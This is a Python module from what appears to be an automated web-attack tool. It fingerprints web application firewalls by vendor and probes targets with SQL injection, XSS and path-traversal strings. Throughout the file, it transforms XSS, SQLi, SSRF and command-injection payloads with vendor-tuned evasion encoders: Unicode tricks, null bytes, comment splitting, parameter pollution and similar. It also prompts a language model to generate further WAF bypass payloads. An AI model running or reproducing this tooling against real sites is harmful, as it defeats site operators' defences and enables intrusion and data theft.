"""
WAF Detection & Bypass Module

Detects WAF type and adapts payloads to bypass it.
Tools: wafw00f, custom detection, AI-powered mutation
"""
import asyncio
import re
import random
import urllib.parse

import httpx

from app.utils.tool_runner import run_command
from app.ai.llm_engine import LLMEngine
from app.utils.http_client import make_client


# WAF bypass encoding functions
class Encoders:
    @staticmethod
    def double_url_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    @staticmethod
    def html_entities(payload: str) -> str:
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"&#{ord(char)};"
            else:
                result += char
        return result

    @staticmethod
    def case_swap(payload: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )

    @staticmethod
    def comment_injection_sql(payload: str) -> str:
        """Insert SQL comments between keywords."""
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
        result = payload
        for kw in keywords:
            result = re.sub(
                rf"\b{kw}\b",
                "/**/".join(kw),
                result,
                flags=re.IGNORECASE,
            )
        return result

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return payload.replace(" ", "%00 ")

    @staticmethod
    def newline_inject(payload: str) -> str:
        return payload.replace(" ", "%0a ")

    @staticmethod
    def tab_inject(payload: str) -> str:
        """Replace spaces with tabs — bypasses space-based WAF rules."""
        return payload.replace(" ", "%09")

    @staticmethod
    def chunk_split(payload: str) -> str:
        """Split payload with chunk-style markers."""
        return "%0d%0a".join(payload[i:i+3] for i in range(0, len(payload), 3))

    @staticmethod
    def concat_bypass_sql(payload: str) -> str:
        """SQL keyword bypass via CONCAT and hex encoding."""
        replacements = {
            "UNION": "UN%69ON",
            "SELECT": "SE%6CECT",
            "FROM": "FR%4FM",
            "WHERE": "WH%45RE",
            "AND": "AN%44",
            "OR ": "%4FR ",
        }
        result = payload
        for k, v in replacements.items():
            result = re.sub(re.escape(k), v, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def hpp_duplicate(payload: str) -> str:
        """HTTP Parameter Pollution — duplicate parameter with split payload."""
        # This returns a marker; actual HPP is handled in adapt_payloads
        return payload

    @staticmethod
    def overlong_utf8(payload: str) -> str:
        """Overlong UTF-8 encoding bypass."""
        result = ""
        for char in payload:
            if char == "<":
                result += "%c0%bc"
            elif char == ">":
                result += "%c0%be"
            elif char == "'":
                result += "%c0%a7"
            elif char == '"':
                result += "%c0%a2"
            else:
                result += char
        return result

    # ── New advanced bypass encoders ──────────────────────────────────

    @staticmethod
    def html_comment_split(payload: str) -> str:
        """Break tags with HTML comments: <script> -> <scr<!---->ipt>."""
        replacements = {
            "script": "scr<!---->ipt",
            "iframe": "ifr<!---->ame",
            "object": "obj<!---->ect",
            "embed": "emb<!---->ed",
            "onload": "onlo<!---->ad",
            "onerror": "oner<!---->ror",
        }
        result = payload
        for old, new in replacements.items():
            result = re.sub(re.escape(old), new, result, flags=re.IGNORECASE, count=1)
        return result

    @staticmethod
    def null_byte_tag_split(payload: str) -> str:
        """Insert null bytes inside tags: <scr%00ipt>."""
        tags = ["script", "iframe", "object", "embed", "select"]
        result = payload
        for tag in tags:
            if tag.lower() in result.lower():
                mid = len(tag) // 2
                pattern = re.compile(re.escape(tag), re.IGNORECASE)
                match = pattern.search(result)
                if match:
                    matched = match.group()
                    result = result[:match.start()] + matched[:mid] + "%00" + matched[mid:] + result[match.end():]
                break
        return result

    @staticmethod
    def newline_in_tag(payload: str) -> str:
        """Insert newlines within HTML tags to bypass single-line regex WAFs."""
        tags = ["script", "iframe", "onload", "onerror"]
        result = payload
        for tag in tags:
            if tag.lower() in result.lower():
                mid = len(tag) // 2
                pattern = re.compile(re.escape(tag), re.IGNORECASE)
                match = pattern.search(result)
                if match:
                    matched = match.group()
                    result = result[:match.start()] + matched[:mid] + "%0a" + matched[mid:] + result[match.end():]
                break
        return result

    @staticmethod
    def fullwidth_unicode(payload: str) -> str:
        """Replace ASCII with fullwidth Unicode equivalents: <script> -> ＜ｓｃｒｉｐｔ＞."""
        # Fullwidth mapping for key characters
        fw_map = {
            "<": "\uff1c", ">": "\uff1e", "(": "\uff08", ")": "\uff09",
            "'": "\uff07", '"': "\uff02", "/": "\uff0f", "=": "\uff1d",
        }
        # Also map lowercase a-z to fullwidth
        result = ""
        for c in payload:
            if c in fw_map:
                result += fw_map[c]
            elif "a" <= c <= "z":
                result += chr(ord(c) - ord("a") + 0xFF41)
            elif "A" <= c <= "Z":
                result += chr(ord(c) - ord("A") + 0xFF21)
            else:
                result += c
        return result

    @staticmethod
    def unicode_confusables(payload: str) -> str:
        """Replace letters with visually similar Unicode characters (confusables)."""
        # Common confusable mappings that some servers normalize back
        confusables = {
            "a": "\u0430",  # Cyrillic а
            "c": "\u0441",  # Cyrillic с
            "e": "\u0435",  # Cyrillic е
            "o": "\u043e",  # Cyrillic о
            "p": "\u0440",  # Cyrillic р
            "s": "\u0455",  # Cyrillic ѕ
            "i": "\u0456",  # Cyrillic і
            "x": "\u0445",  # Cyrillic х
        }
        result = ""
        for c in payload:
            if c.lower() in confusables and random.random() > 0.5:
                result += confusables[c.lower()]
            else:
                result += c
        return result

    @staticmethod
    def js_protocol_variations(payload: str) -> str:
        """Advanced javascript: protocol bypass tricks."""
        if "javascript:" not in payload.lower():
            return payload
        replacements = [
            ("javascript:", "java\tscript:"),
            ("javascript:", "java\x00script:"),
            ("javascript:", "&#x6a;avascript:"),
            ("javascript:", "jav&#x61;script:"),
            ("javascript:", "java%09script:"),
            ("javascript:", "data:text/html,<script>/**/"),
        ]
        old, new = random.choice(replacements)
        return re.sub(re.escape("javascript:"), new, payload, flags=re.IGNORECASE, count=1)

    @staticmethod
    def sql_comment_keyword_bypass(payload: str) -> str:
        """MySQL version-comment bypass: UNION -> /*!50000UNION*/."""
        keywords = ["UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "FROM", "WHERE"]
        result = payload
        for kw in keywords:
            result = re.sub(
                rf"\b{kw}\b",
                f"/*!50000{kw}*/",
                result,
                flags=re.IGNORECASE,
                count=1,
            )
        return result

    @staticmethod
    def hpp_split_payload(payload: str) -> str:
        """HTTP Parameter Pollution: split payload into duplicate params.
        Returns a marker string; actual splitting handled at HTTP layer."""
        if len(payload) > 6:
            mid = len(payload) // 2
            return f"HPP_SPLIT:{payload[:mid]}|||{payload[mid:]}"
        return payload

    @staticmethod
    def content_type_json(payload: str) -> str:
        """Hint to send payload as JSON body (many WAFs only inspect form data)."""
        return f"CT_JSON:{payload}"

    @staticmethod
    def gbk_encoding(payload: str) -> str:
        """GBK multibyte encoding trick: ' -> %bf%27 (bypasses addslashes on GBK)."""
        return payload.replace("'", "%bf%27").replace('"', "%bf%22")

    @staticmethod
    def backslash_escape(payload: str) -> str:
        """MySQL backslash escaping bypass."""
        return payload.replace("'", "\\'").replace('"', '\\"')

    @staticmethod
    def js_string_fromcharcode(payload: str) -> str:
        """Convert XSS payload to String.fromCharCode — evades regex-based WAFs."""
        if "<script>" not in payload.lower() and "alert" not in payload.lower():
            return payload
        # Extract just the JS expression, wrap in fromCharCode
        codes = ",".join(str(ord(c)) for c in payload)
        return f"<img src=x onerror=eval(String.fromCharCode({codes}))>"

    @staticmethod
    def svg_event_handler(payload: str) -> str:
        """Convert XSS to SVG-based event handler — bypasses <script> filters."""
        if "<script>" not in payload.lower():
            return payload
        # Extract alert/JS code from script tags
        inner = re.sub(r'</?script[^>]*>', '', payload, flags=re.IGNORECASE).strip()
        return f'<svg onload="{inner}">'

    @staticmethod
    def js_template_literal(payload: str) -> str:
        """Use JS template literals to bypass quote filters."""
        if "alert" in payload:
            return "<img src=x onerror=alert`1`>"
        return payload

    @staticmethod
    def math_expression_sqli(payload: str) -> str:
        """Replace 1=1 with mathematical expression for SQLi."""
        return payload.replace("1=1", "1<2").replace("'1'='1'", "'a'<'b'")

    @staticmethod
    def json_content_type(payload: str) -> str:
        """Hint to use JSON content-type — many WAFs only inspect form data."""
        # This is a marker; actual content-type switching handled in exploit phase
        return f"JSON_CT:{payload}"

    @staticmethod
    def multipart_boundary(payload: str) -> str:
        """Hint to use multipart encoding — bypasses body inspection."""
        return f"MULTIPART:{payload}"

    @staticmethod
    def header_injection(payload: str) -> str:
        """Inject via X-Forwarded-For or other headers that bypass WAF."""
        return f"HEADER_INJECT:{payload}"

    @staticmethod
    def line_break_split(payload: str) -> str:
        """Split keywords across multiple lines — bypasses single-line regex."""
        keywords = ["script", "alert", "onerror", "onload", "SELECT", "UNION"]
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                idx = result.lower().find(kw.lower())
                mid = idx + len(kw) // 2
                result = result[:mid] + "\n" + result[mid:]
                break
        return result

    @staticmethod
    def ip_decimal_bypass(payload: str) -> str:
        """Convert SSRF IPs to decimal format — bypasses IP blocklists."""
        # 127.0.0.1 → 2130706433
        import re as _re
        ip_match = _re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', payload)
        if ip_match:
            a, b, c, d = [int(x) for x in ip_match.groups()]
            decimal_ip = (a << 24) + (b << 16) + (c << 8) + d
            return _re.sub(r'\d+\.\d+\.\d+\.\d+', str(decimal_ip), payload, count=1)
        return payload

    @staticmethod
    def ip_hex_bypass(payload: str) -> str:
        """Convert SSRF IPs to hex format."""
        import re as _re
        ip_match = _re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', payload)
        if ip_match:
            hex_ip = ".".join(f"0x{int(x):02x}" for x in ip_match.groups())
            return _re.sub(r'\d+\.\d+\.\d+\.\d+', hex_ip, payload, count=1)
        return payload

    @staticmethod
    def protocol_relative_url(payload: str) -> str:
        """Convert http:// to // — bypasses protocol-specific filters."""
        return payload.replace("http://", "//").replace("https://", "//")


class WAFModule:
    def __init__(self):
        self.llm = LLMEngine()
        self.encoders = Encoders()

    async def detect(self, domain: str) -> dict:
        """Detect WAF presence and type."""
        results = await asyncio.gather(
            self._wafw00f_detect(domain),
            self._custom_detect(domain),
            return_exceptions=True,
        )

        waf_info = {
            "detected": False,
            "waf_name": None,
            "waf_vendor": None,
            "bypass_difficulty": "unknown",
        }

        for result in results:
            if isinstance(result, dict) and result.get("detected"):
                waf_info.update(result)
                break

        # Enrich with vendor info and bypass difficulty rating
        if waf_info["detected"]:
            waf_name_lower = (waf_info.get("waf_name") or "").lower()
            waf_info["waf_vendor"] = self._resolve_vendor(waf_name_lower)
            waf_info["bypass_difficulty"] = self._rate_bypass_difficulty(waf_name_lower)

        return waf_info

    @staticmethod
    def _resolve_vendor(waf_name: str) -> str:
        """Resolve WAF vendor from detected name."""
        vendor_map = {
            "cloudflare": "Cloudflare",
            "aws": "Amazon", "awselb": "Amazon", "amazon": "Amazon",
            "akamai": "Akamai",
            "imperva": "Imperva", "incapsula": "Imperva",
            "modsecurity": "Trustwave/OWASP", "mod_security": "Trustwave/OWASP",
            "sucuri": "GoDaddy/Sucuri",
            "f5": "F5 Networks", "big-ip": "F5 Networks", "bigip": "F5 Networks",
            "barracuda": "Barracuda Networks",
            "fortiweb": "Fortinet", "fortinet": "Fortinet",
            "wallarm": "Wallarm",
            "wordfence": "Defiant/Wordfence",
        }
        for key, vendor in vendor_map.items():
            if key in waf_name:
                return vendor
        return "Unknown"

    @staticmethod
    def _rate_bypass_difficulty(waf_name: str) -> str:
        """Rate bypass difficulty for the detected WAF."""
        hard = ["cloudflare", "akamai", "imperva", "incapsula"]
        medium = ["modsecurity", "aws", "f5", "big-ip", "fortiweb", "wallarm"]
        easy = ["sucuri", "barracuda", "wordfence"]
        for w in hard:
            if w in waf_name:
                return "hard"
        for w in medium:
            if w in waf_name:
                return "medium"
        for w in easy:
            if w in waf_name:
                return "easy"
        return "unknown"

    async def _wafw00f_detect(self, domain: str) -> dict:
        """Detect WAF using wafw00f."""
        try:
            target_url = self._base_url if hasattr(self, '_base_url') else f"https://{domain}"
            output = await run_command(
                ["wafw00f", target_url, "-o", "-"],
                timeout=30,
            )
            if output and "is behind" in output:
                # Parse WAF name
                match = re.search(r"is behind (.+?)(?:\s|$)", output)
                waf_name = match.group(1).strip() if match else "Unknown"
                return {
                    "detected": True,
                    "waf_name": waf_name,
                    "source": "wafw00f",
                }
        except Exception:
            pass
        return {"detected": False}

    async def _custom_detect(self, domain: str) -> dict:
        """Custom WAF detection via response analysis."""
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status", "cf-request-id"],
            "AWS WAF": ["x-amzn-requestid", "awselb", "x-amz-cf-id", "x-amz-apigw-id"],
            "Akamai": ["akamai", "x-akamai", "akamai-origin-hop", "x-akamai-transformed"],
            "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo", "x-cdn=imperva"],
            "ModSecurity": ["mod_security", "modsecurity", "x-modsecurity"],
            "Sucuri": ["sucuri", "x-sucuri", "x-sucuri-id", "x-sucuri-cache"],
            "F5 BIG-IP": ["bigip", "x-wa-info", "bigipserver", "f5-trafficshield"],
            "Barracuda": ["barra_counter_session", "barracuda"],
            "FortiWeb": ["fortiwafsid", "x-fw-debug", "fortiweb"],
            "Wallarm": ["x-wallarm", "wallarm"],
            "Wordfence": ["wordfence", ".wordfence"],
            "Edgecast/Verizon": ["x-ec-custom-error", "ecdf", "verizon"],
        }

        try:
            # Send a suspicious request to trigger WAF
            test_payloads = [
                "' OR 1=1--",
                "<script>alert(1)</script>",
                "../../etc/passwd",
            ]

            async with make_client() as client:
                # Normal request for baseline
                target_url = self._base_url if hasattr(self, '_base_url') else f"https://{domain}"
                normal = await client.get(target_url)
                normal_headers = {k.lower(): v.lower() for k, v in normal.headers.items()}

                # Check headers for WAF signatures
                all_headers = " ".join(f"{k}={v}" for k, v in normal_headers.items())
                for waf_name, signatures in waf_signatures.items():
                    for sig in signatures:
                        if sig.lower() in all_headers:
                            return {
                                "detected": True,
                                "waf_name": waf_name,
                                "source": "header_analysis",
                            }

                # Send malicious request and compare
                for payload in test_payloads:
                    try:
                        resp = await client.get(
                            f"{target_url}/?test={urllib.parse.quote(payload)}"
                        )
                        if resp.status_code in (403, 406, 429, 503):
                            return {
                                "detected": True,
                                "waf_name": "Unknown (blocked malicious request)",
                                "source": "behavior_analysis",
                                "block_status": resp.status_code,
                            }
                    except Exception:
                        continue

        except Exception:
            pass

        return {"detected": False}

    async def adapt_payloads(self, payloads: list[dict], waf_info: dict) -> list[dict]:
        """Adapt payloads to bypass detected WAF using vuln-type-specific strategies."""
        waf_name = waf_info.get("waf_name", "").lower()
        adapted = []

        # Base encoders (work for all vuln types)
        base_encoders = [
            self.encoders.double_url_encode,
            self.encoders.case_swap,
            self.encoders.tab_inject,
        ]

        # XSS-specific encoders
        xss_encoders = [
            self.encoders.html_entities,
            self.encoders.js_string_fromcharcode,
            self.encoders.svg_event_handler,
            self.encoders.js_template_literal,
            self.encoders.overlong_utf8,
            self.encoders.unicode_encode,
            self.encoders.html_comment_split,
            self.encoders.null_byte_tag_split,
            self.encoders.newline_in_tag,
            self.encoders.fullwidth_unicode,
            self.encoders.js_protocol_variations,
        ]

        # SQLi-specific encoders
        sqli_encoders = [
            self.encoders.comment_injection_sql,
            self.encoders.concat_bypass_sql,
            self.encoders.math_expression_sqli,
            self.encoders.null_byte_inject,
            self.encoders.newline_inject,
            self.encoders.backslash_escape,
            self.encoders.sql_comment_keyword_bypass,
            self.encoders.gbk_encoding,
        ]

        # SSRF-specific encoders
        ssrf_encoders = [
            self.encoders.ip_decimal_bypass,
            self.encoders.ip_hex_bypass,
            self.encoders.protocol_relative_url,
            self.encoders.double_url_encode,
        ]

        # WAF-specific priority adjustments
        if "cloudflare" in waf_name:
            base_encoders = [self.encoders.double_url_encode, self.encoders.unicode_encode,
                             self.encoders.fullwidth_unicode, self.encoders.unicode_confusables,
                             self.encoders.case_swap, self.encoders.tab_inject]
        elif "akamai" in waf_name:
            base_encoders = [self.encoders.null_byte_inject, self.encoders.double_url_encode,
                             self.encoders.fullwidth_unicode, self.encoders.newline_inject,
                             self.encoders.overlong_utf8]
        elif "imperva" in waf_name or "incapsula" in waf_name:
            base_encoders = [self.encoders.chunk_split, self.encoders.double_url_encode,
                             self.encoders.tab_inject, self.encoders.html_comment_split,
                             self.encoders.case_swap]
        elif "modsecurity" in waf_name:
            base_encoders = [self.encoders.overlong_utf8, self.encoders.null_byte_inject,
                             self.encoders.unicode_encode, self.encoders.sql_comment_keyword_bypass,
                             self.encoders.gbk_encoding, self.encoders.newline_inject]
        elif "f5" in waf_name or "big-ip" in waf_name:
            base_encoders = [self.encoders.double_url_encode, self.encoders.tab_inject,
                             self.encoders.case_swap, self.encoders.chunk_split,
                             self.encoders.null_byte_tag_split]
        elif "aws" in waf_name:
            base_encoders = [self.encoders.double_url_encode, self.encoders.case_swap,
                             self.encoders.newline_in_tag, self.encoders.fullwidth_unicode,
                             self.encoders.tab_inject]
        elif "sucuri" in waf_name:
            base_encoders = [self.encoders.double_url_encode, self.encoders.overlong_utf8,
                             self.encoders.html_comment_split, self.encoders.unicode_confusables,
                             self.encoders.case_swap]
        elif "barracuda" in waf_name:
            base_encoders = [self.encoders.null_byte_inject, self.encoders.chunk_split,
                             self.encoders.double_url_encode, self.encoders.newline_in_tag,
                             self.encoders.tab_inject]

        for payload_data in payloads:
            original = payload_data.get("payload", "")
            if not original:
                continue
            vtype = payload_data.get("vuln_type", "").lower()

            # Keep original
            adapted.append(payload_data)

            # Select encoders based on vuln type
            if vtype in ("xss", "xss_reflected", "xss_stored", "xss_dom"):
                encoders = base_encoders + xss_encoders
            elif vtype in ("sqli", "sqli_blind", "nosql_injection"):
                encoders = base_encoders + sqli_encoders
            elif vtype in ("ssrf",):
                encoders = ssrf_encoders + base_encoders
            elif vtype in ("ssti", "cmd_injection"):
                encoders = base_encoders + [
                    self.encoders.null_byte_inject,
                    self.encoders.newline_inject,
                    self.encoders.unicode_encode,
                ]
            else:
                encoders = base_encoders

            # Generate encoded variants
            seen = {original}
            for encoder in encoders:
                try:
                    encoded = encoder(original)
                    if encoded and encoded not in seen:
                        seen.add(encoded)
                        new_payload = payload_data.copy()
                        new_payload["payload"] = encoded
                        new_payload["encoding"] = encoder.__name__
                        new_payload["waf_bypass"] = True
                        adapted.append(new_payload)
                except Exception:
                    continue

            # HTTP Parameter Pollution: split payload across duplicate params
            if payload_data.get("params"):
                param = payload_data["params"][0] if isinstance(payload_data["params"], list) else payload_data["params"]
                if len(original) > 6:
                    mid = len(original) // 2
                    hpp_payload = payload_data.copy()
                    hpp_payload["payload"] = original[:mid]
                    hpp_payload["hpp_extra"] = {param: original[mid:]}
                    hpp_payload["encoding"] = "hpp_split"
                    hpp_payload["waf_bypass"] = True
                    adapted.append(hpp_payload)

        # Use AI to generate additional WAF-specific bypass payloads
        try:
            ai_bypasses = await self._ai_generate_bypasses(waf_name, payloads[:5])
            adapted.extend(ai_bypasses)
        except Exception:
            pass

        return adapted

    async def _ai_generate_bypasses(self, waf_name: str, sample_payloads: list[dict]) -> list[dict]:
        """Use AI to generate WAF-specific bypass payloads."""
        vuln_types = set(p.get("vuln_type", "xss") for p in sample_payloads)

        prompt = f"""Generate 10 advanced WAF bypass payloads for {waf_name} WAF.

Vulnerability types to bypass for: {', '.join(vuln_types)}

Original payloads being blocked:
{[p['payload'] for p in sample_payloads[:5]]}

Use techniques like:
- Double encoding
- Unicode normalization bypass
- HTTP parameter pollution
- Chunked transfer
- Case manipulation
- Comment injection
- Null byte injection
- Content-type tricks

Respond as JSON array of objects:
[{{"vuln_type": "type", "payload": "the payload", "technique": "bypass technique used"}}]"""

        try:
            result = await self.llm.analyze(prompt)
            import json
            if "```" in result:
                result = result.split("```")[1].split("```")[0]
                if result.startswith("json"):
                    result = result[4:]
            ai_payloads = json.loads(result.strip())

            adapted = []
            for p in ai_payloads:
                adapted.append({
                    "vuln_type": p.get("vuln_type", "xss"),
                    "payload": p.get("payload", ""),
                    "target_url": sample_payloads[0].get("target_url", ""),
                    "params": sample_payloads[0].get("params", []),
                    "method": "GET",
                    "encoding": f"ai_bypass_{p.get('technique', 'unknown')}",
                    "waf_bypass": True,
                })
            return adapted
        except Exception:
            return []
